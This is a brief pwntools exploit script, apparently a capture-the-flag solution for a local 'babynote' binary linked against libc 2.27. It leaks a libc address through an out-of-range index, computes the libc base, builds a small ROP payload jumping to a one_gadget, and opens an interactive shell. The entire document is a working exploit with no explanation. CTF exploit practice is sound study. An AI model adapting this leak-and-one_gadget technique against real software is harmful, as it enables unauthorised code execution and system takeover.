#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./babynote', env = {'LD_PRELOAD' : './libc-2.27.so'})
libc = ELF('./libc-2.27.so')

def cmd(x):
    r.recvuntil('> ')
    r.sendline(str(x))

def new(i,l,s):
    cmd(1)
    r.recvuntil('index: ')
    r.sendline(str(i))
    r.recvuntil('size: ')
    r.sendline(str(int(l)))
    r.recvuntil('data: ')
    r.sendline(str(s))
    

def show(i):
    cmd(2)
    r.recvuntil('index: ')
    r.sendline(str(i))

r.recvuntil('n: ')
r.sendline(str(0xffff))

show(28)
r.recv(10)
libc_base = u64(r.recv(6).ljust(8,'\x00')) - 0x199e10
print '[*] libc_base :', hex(libc_base)

one_gadget = libc_base + 0x4f2c5 

rop = flat(
    0xdeadbeef, one_gadget        
)

new(6, 0x40, rop)
cmd(0)

r.interactive()
